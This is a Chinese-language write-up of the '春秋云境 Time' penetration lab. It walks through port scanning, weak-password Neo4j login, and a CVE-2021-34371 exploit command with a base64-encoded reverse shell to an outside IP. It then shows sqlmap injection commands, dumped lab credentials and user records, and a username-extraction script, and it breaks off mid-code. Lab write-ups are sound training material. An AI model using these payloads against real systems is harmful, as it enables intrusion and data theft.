+++
date = '2026-03-09T11:00:00+08:00'
lastmod = '2026-03-09T11:00:00+08:00'
draft = false
title = '春秋云境 - Time WriteUP'
categories = ['WriteUP', '春秋云境']
tags = ['WriteUP', '春秋云境']

+++

## flag 1

首先，我们拿 fscan 先扫一波，扫描结果如下。

```plaintext
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.136.207:22 open
39.99.136.207:1337 open
39.99.136.207:7473 open
39.99.136.207:7474 open
39.99.136.207:7687 open
39.99.136.207:39683 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://39.99.136.207:7474 code:303 len:0      title:None 跳转url: http://39.99.136.207:7474/browser/
[*] WebTitle http://39.99.136.207:7474/browser/ code:200 len:3279   title:Neo4j Browser
[*] WebTitle https://39.99.136.207:7687 code:400 len:50     title:None
[*] WebTitle https://39.99.136.207:7473 code:303 len:0      title:None 跳转url: https://39.99.136.207:7473/browser/
[*] WebTitle https://39.99.136.207:7473/browser/ code:200 len:3279   title:Neo4j Browser
已完成 6/6
[*] 扫描结束,耗时: 4m52.2951086s
```

我们发现这个服务器上存在 neo4j 的服务，而且开放了 7474 端口，我们可以访问到 neo4j 的控制台，使用 `neo4j/neo4j` 弱口令直接登录进去，查看 neo4j 的版本号。

![](../assets/屏幕截图%202025-03-27%20094909.png)

那么我们搜索相关版本漏洞，发现该版本存在 `CVE-2021-34371` 漏洞，在 `Neo4j 3.4.18` 及以前，如果开启了 Neo4j Shell 接口，攻击者将可以通过 RMI 协议以未授权的身份调用任意方法，其中 `setSessionVariable` 方法存在反序列化漏洞。因为这个漏洞并非 RMI 反序列化，所以不受到 Java 版本的影响。

在 Neo4j 3.5 及之后的版本，Neo4j Shell 被 Cyber Shell 替代。  

我们找到 Payload 如下，[rhino_gadget](https://github.com/vulhub/vulhub/tree/master/neo4j/CVE-2021-34371/rhino_gadget)

```bash
mvn install
```

然后，去跑 Payload。

```bash
java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi://39.99.136.207:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzIuMTQ4LjEzMS8xMjM1IDA+JjE=}|{base64,-d}|{bash,-i}"
```

我们反弹 Shell 成功，拿到第一个 flag。

```plaintext
 ██████████ ██                    
░░░░░██░░░ ░░                     
    ░██     ██ ██████████   █████ 
    ░██    ░██░░██░░██░░██ ██░░░██
    ░██    ░██ ░██ ░██ ░██░███████
    ░██    ░██ ░██ ░██ ░██░██░░░░ 
    ░██    ░██ ███ ░██ ░██░░██████
    ░░     ░░ ░░░  ░░  ░░  ░░░░░░ 


flag01: flag{345ddd49-6e16-4566-90c7-9019fca569a4}

Do you know the authentication process of Kerberos? 
......This will be the key to your progress.
```

## flag 2

先收集一波内网网卡信息。

```plaintext
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe32:7512  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:32:75:12  txqueuelen 1000  (Ethernet)
        RX packets 488799  bytes 216049172 (216.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 389087  bytes 50387159 (50.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1506  bytes 139936 (139.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1506  bytes 139936 (139.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

上 fscan 扫描。

```plaintext
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.6.12     is alive
(icmp) Target 172.22.6.38     is alive
(icmp) Target 172.22.6.25     is alive
(icmp) Target 172.22.6.36     is alive
[*] Icmp alive hosts len is: 4
172.22.6.12:53 open
172.22.6.25:135 open
172.22.6.12:135 open
172.22.6.36:22 open
172.22.6.38:22 open
172.22.6.25:139 open
172.22.6.12:139 open
172.22.6.38:80 open
172.22.6.12:88 open
172.22.6.12:389 open
172.22.6.12:464 open
172.22.6.25:445 open
172.22.6.12:445 open
172.22.6.12:593 open
172.22.6.12:636 open
172.22.6.36:1337 open
172.22.6.12:3268 open
172.22.6.12:3269 open
172.22.6.12:3389 open
172.22.6.25:3389 open
172.22.6.36:7473 open
172.22.6.36:7474 open
172.22.6.36:7687 open
172.22.6.12:9389 open
172.22.6.12:15774 open
172.22.6.25:15774 open
172.22.6.36:39683 open
172.22.6.12:47001 open
172.22.6.25:47001 open
172.22.6.12:49156 open
172.22.6.12:49664 open
172.22.6.25:49664 open
172.22.6.12:49665 open
172.22.6.25:49665 open
172.22.6.12:49666 open
172.22.6.25:49666 open
172.22.6.12:49667 open
172.22.6.25:49667 open
172.22.6.25:49668 open
172.22.6.25:49669 open
172.22.6.25:49670 open
172.22.6.12:49671 open
172.22.6.12:49674 open
172.22.6.12:49675 open
172.22.6.25:49675 open
172.22.6.12:49678 open
172.22.6.25:49676 open
172.22.6.12:49687 open
172.22.6.12:49766 open
[*] alive ports len is: 49
start vulscan
[*] NetInfo 
[*]172.22.6.12
   [->]DC-PROGAME
   [->]172.22.6.12
[*] NetBios 172.22.6.25     XIAORANG\WIN2019              
[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录
[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)
[*] NetInfo 
[*]172.22.6.25
   [->]WIN2019
   [->]172.22.6.25
[*] WebTitle http://172.22.6.36:7474   code:303 len:0      title:None 跳转url: http://172.22.6.36:7474/browser/
[*] WebTitle http://172.22.6.25:47001  code:404 len:315    title:Not Found
[*] WebTitle http://172.22.6.36:7474/browser/ code:200 len:3279   title:Neo4j Browser
[*] WebTitle http://172.22.6.12:47001  code:404 len:315    title:Not Found
[*] WebTitle https://172.22.6.36:7473  code:303 len:0      title:None 跳转url: https://172.22.6.36:7473/browser/
[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None
[*] WebTitle https://172.22.6.36:7473/browser/ code:200 len:3279   title:Neo4j Browser
已完成 47/49 [-] (60/210) rdp 172.22.6.12:3389 administrator sysadmin remote error: tls: access denied 
已完成 47/49 [-] (119/210) rdp 172.22.6.25:3389 admin 1qaz@WSX remote error: tls: access denied 
已完成 47/49 [-] (179/210) rdp 172.22.6.12:3389 guest a123456. remote error: tls: access denied 
已完成 49/49
[*] 扫描结束,耗时: 4m45.434786479s
```

我们先看看 `http://172.22.6.38`，是一个后台登录页面，我们尝试弱口令爆破，尝试无果，尝试使用 SQLMap 一把梭。

```cmd
python sqlmap.py -u http://172.22.6.38/index.php --forms --batch --output-dir=reports/
```

![](../assets/446c0038-9023-4d32-b84f-2dd6ac72260b.png)

发现存在联合注入和盲注，进行注入。

```cmd
python sqlmap.py -u http://172.22.6.38/index.php --dbs --forms --batch --output-dir=reports/
python sqlmap.py -u http://172.22.6.38/index.php -D "oa_db" --tables --forms --batch --output-dir=reports/
python sqlmap.py -u http://172.22.6.38/index.php -D "oa_db" -T "oa_f1Agggg" --dump --forms --batch --output-dir=reports/
```

![](../assets/748632d8-1ba9-4f9a-8feb-2dbb7c15fbe1.png)

我们成功拿到第二个 flag。

![](../assets/842a4a51-4783-42f7-9de2-15f79e8c1baa.png)

## flag 3

接下来，我们把剩下的 `oa_admin` 和 `oa_users` 的信息都导出来，为后续渗透做准备。

```cmd
python sqlmap.py -u http://172.22.6.38/index.php -D "oa_db" -T "oa_admin" --dump --forms --batch --output-dir=reports/
python sqlmap.py -u http://172.22.6.38/index.php -D "oa_db" -T "oa_users" --dump --forms --batch --output-dir=reports/
```

结果如下。

```plaintext
Database: oa_db
Table: oa_admin
[1 entry]
+----+------------------+---------------+
| id | password         | username      |
+----+------------------+---------------+
| 1  | bo2y8kAL3HnXUiQo | administrator |
+----+------------------+---------------+

Database: oa_db
Table: oa_users
[500 entries]
+-----+----------------------------+-------------+-----------------+
| id  | email                      | phone       | username        |
+-----+----------------------------+-------------+-----------------+
[17:31:44] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |
| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |
| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |
| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |
| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |
| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |
| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |
| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |
| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |
| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |
| 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         |
| 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          |
| 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           |
| 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    |
| 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         |
| 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         |
| 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         |
| 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         |
| 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         |
| 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       |
| 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         |
| 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          |
| 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        |
| 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  |
| 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       |
| 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        |
| 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       |
| 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       |
| 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          |
| 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        |
| 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       |
| 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        |
| 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        |
| 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     |
| 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         |
| 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     |
| 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        |
| 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         |
| 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          |
| 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        |
| 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       |
| 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        |
| 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         |
| 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          |
| 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     |
| 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          |
| 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         |
| 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       |
| 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          |
| 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           |
| 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     |
| 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        |
| 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       |
| 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        |
| 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       |
| 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       |
| 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         |
| 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          |
| 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        |
| 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        |
| 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          |
| 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      |
| 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         |
| 308 | didi@xiaorang.lab          | 13413041463 | DI DI           |
| 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         |
| 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       |
| 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        |
| 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          |
| 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     |
| 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     |
| 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        |
| 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       |
| 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        |
| 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        |
| 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          |
| 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           |
| 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         |
| 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       |
| 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         |
| 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        |
| 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         |
| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |
| 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        |
| 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         |
| 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          |
| 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    |
| 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    |
| 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          |
| 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         |
| 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         |
| 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          |
| 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       |
| 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      |
| 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          |
| 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          |
| 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       |
| 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         |
| 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         |
| 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      |
| 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          |
| 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       |
| 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        |
| 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         |
| 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         |
| 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          |
| 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          |
| 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        |
| 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       |
| 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       |
| 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        |
| 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      |
| 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         |
| 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        |
| 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      |
| 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       |
| 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        |
| 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         |
| 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        |
| 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           |
| 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           |
| 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          |
| 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      |
| 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       |
| 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         |
| 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         |
| 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         |
| 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         |
| 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         |
| 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        |
| 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        |
| 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        |
| 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     |
| 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     |
| 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        |
| 379 | heli@xiaorang.lab          | 13701347081 | HE LI           |
| 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        |
| 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          |
| 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       |
| 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       |
| 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          |
| 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          |
| 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       |
| 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           |
| 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         |
| 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        |
| 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         |
| 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    |
| 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         |
| 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        |
| 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          |
| 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          |
| 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     |
| 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        |
| 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          |
| 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          |
| 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       |
| 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        |
| 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       |
| 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          |
| 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       |
| 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        |
| 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        |
| 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         |
| 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       |
| 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        |
| 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        |
| 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         |
| 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       |
| 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         |
| 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          |
| 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       |
| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |
| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |
| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |
| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |
| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |
| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |
| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |
| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |
| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |
| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |
| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |
| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |
| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |
| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |
| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |
| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |
| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |
| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |
| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |
| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |
| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |
| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |
| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |
| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |
| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |
| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |
| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |
| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |
| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |
| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |
| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |
| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |
| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |
| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |
| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |
| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |
| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |
| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |
| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |
| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |
| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |
| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |
| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |
| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |
| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |
| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |
| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |
| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |
| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |
| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |
| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |
| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |
| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |
| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |
| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |
| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |
| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |
| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
+-----+----------------------------+-------------+-----------------+
```

我们尝试用这些账户，去 RDP 到 `172.22.6.12` 或者是 `172.22.6.25` 上，试了一下 administrator 登不上去之后，就猜测可能和 2022 网鼎半决那个一样，要去无认证探测账户了。

用 AI 搓了一个脚本去提取数据，最后再加上单独的 administrator 即可。

```python
"""
从数据库导出文件中提取用户名的脚本
使用正则表达式匹配，确保通用性
"""

import re
import sys


def extract_usernames(input_file, output_file):
    """
    从输入文件中提取用户名并保存到输出文件

    Args:
        input_file: 输入文件路径（包含数据库导出数据）
        output_file: 输出文件路径（保存提取的用户名）
    """
    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            content = f.read()
    except FileNotFoundError:
        print(f"错误: 找不到文件 {input_file}")
        return False
    except Exception as e:
        print(f"错误: 读取文件时发生异常 - {e}")
        return False

    # 正则表达式匹配邮箱地址中的用户名（@前面的部分）
    # 模式说明：
    # ([a-zA-Z0-9_]+) - 捕获@前面的用户名（字母、数字、下划线）
    # @xiaorang\.lab  - 匹配域名部分
    #
    # 注意：这里匹配的是邮箱地址中 @ 前面的部分
    pattern = r'([a-zA-Z0-9_]+)@xiaorang\.lab'

    # 使用正则表达式查找所有匹配的用户名
    matches = re.findall(pattern, content)

    # 去重并清理用户名（去除首尾空格）
    usernames = []
    seen = set()

    for username in matches:
        # 清理用户名：去除首尾空格
        cleaned_username = username.strip()

        # 过滤掉空字符串和非用户名内容
        if cleaned_username and len(cleaned_username) > 0:
            # 去重
            if cleaned_username not in seen:
                seen.add(cleaned_username)
                usernames.append(cleaned_username)

    # 如果没有找到用户名，尝试更宽松的正则表达式
    if not usernames:
        print("使用更宽松的正则表达式重新匹配...")
        # 更宽松的模式：匹配任何在竖线之间的非竖线字符
        pattern = r'\|\s*([^\|]+)\s*\|'
        matches = re.findall(pattern, content)

        for match in matches:
            cleaned = match.strip()
            # 过滤掉表头、数字、ID等非用户名内容
            if cleaned and not cleaned.isdigit() and cleaned not in ['id', 'password', 'email', 'phone', 'username']:
                if cleaned not in seen:
                    seen.add(cleaned)
                    usernames.append(cleaned)

    # 写入输出文件
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            for username in usernames:
                f.write(username + '\n')

        print(f"成功提取 {len(usernames)} 个用户名")
        print(f"输出文件: {output_file}")
        return True
    except Exception as e:
        print(f"错误: 写入文件时发生异常 - {e}")
        return False


def main():
    """主函数"""
